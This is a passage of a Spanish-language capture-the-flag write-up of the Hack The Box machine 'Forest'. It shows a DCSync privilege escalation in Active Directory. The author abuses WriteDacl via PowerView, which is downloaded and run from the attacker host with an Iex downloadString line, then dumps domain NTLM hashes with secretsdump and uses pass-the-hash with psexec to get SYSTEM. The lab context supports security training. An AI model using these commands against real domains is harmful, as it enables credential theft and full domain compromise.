+Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; net user fmiracle
+User name                    fmiracle
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/11/2023 3:29:16 PM
+Password expires             Never
+Password changeable          10/12/2023 3:29:16 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Exchange Windows Perm*Domain Users
+The command completed successfully.
+</code></pre>
+
+<p>Ahora que estamos dentro este grupo podemos aprovecharnos del privilegio <code>WriteDacl</code> y ejecutar un <code>Dcsync Attack</code>, para ello ejecutamos los siguientes comandos.</p>
+
+<pre><code class="language-bash">Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; $SecPassword = ConvertTo-SecureString 'fmiracle123$!' -AsPlainText -Force
+Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; $Cred = New-Object System.Management.Automation.PSCredential('htb.local\fmiracle', $SecPassword)
+</code></pre>
+
+<p>Despues vamos a descargarnos e importar el modulo de <code>PowerView.ps1</code></p>
+
+<ul>
+  <li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a></li>
+</ul>
+
+<pre><code class="language-bash">❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.161 - - [11/Oct/2023 17:32:48] "GET /PowerView.ps1 HTTP/1.1" 200 -
+</code></pre>
+
+<pre><code class="language-bash">Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; Iex(New-Object Net.WebClient).downloadString('http://10.10.16.10/PowerView.ps1')
+</code></pre>
+<p>Finalmente ejecutamos la función <code>Add-DomainObjectAcl</code> del <code>PowerView.ps1</code> que importamos.</p>
+
+<pre><code class="language-bash">Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb, DC=local" -PrincipalIdentity fmiracle -Rights DCSync
+</code></pre>
+
+<p>Y ahora en nuestro equipo podemos usar <code>secretdump</code> usando las credenciales del usuario <code>fmiracle</code> y podemos dumpearnos todos los hashes del dominio.</p>
+
+<pre><code class="language-bash">❯ secretsdump.py htb.local/fmiracle@10.10.10.161
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denid
+[*] Dumping Domain Credentials 
+[*] Using the DRSUAPI method to get NTDS.DIT secret
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</code></pre>
+
+<p>Aplicamos <code>pass the hash</code> con <code>psexec.py</code> para conectarnos como el usuario <code>Administrator</code>, nos dirigimos al directorio personal del usuario y podemos visualizar la segunda flag <code>root.txt</code>.</p>
+
+<pre><code class="language-bash">❯ psexec.py htb.local/Administrator@10.10.10.161 -hashes :32693b11e6aa90eb43d32c72a07ceea6
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Requesting shares on 10.10.10.161.....
+[*] Found writable share ADMIN$
+[*] Uploading file bUDVoWTk.exe
+[*] Opening SVCManager on 10.10.10.161.....
+[*] Creating service jeFE on 10.10.10.161.....
+[*] Starting service jeFE.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+
+C:\Windows\system32&gt; cd C:\Users\Administrator\Desktop
+
+C:\Users\Administrator\Desktop&gt; type root.txt
+84831d87fd5fe84052c8fb99dd4b9c5
+</code></pre>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina Forest - htb writeup&url=http://localhost:4000/hackthebox/htb-writeup-Forest" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
